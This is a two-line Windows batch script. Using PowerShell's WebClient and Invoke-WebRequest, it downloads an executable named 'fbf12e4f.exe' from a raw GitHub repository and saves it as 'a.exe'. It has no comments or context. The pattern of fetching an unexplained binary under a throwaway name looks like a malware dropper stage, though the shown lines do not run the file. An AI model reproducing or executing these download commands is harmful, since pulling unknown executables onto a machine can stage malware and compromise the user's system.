@echo off

powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe', 'a.exe')"
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile a.exe"
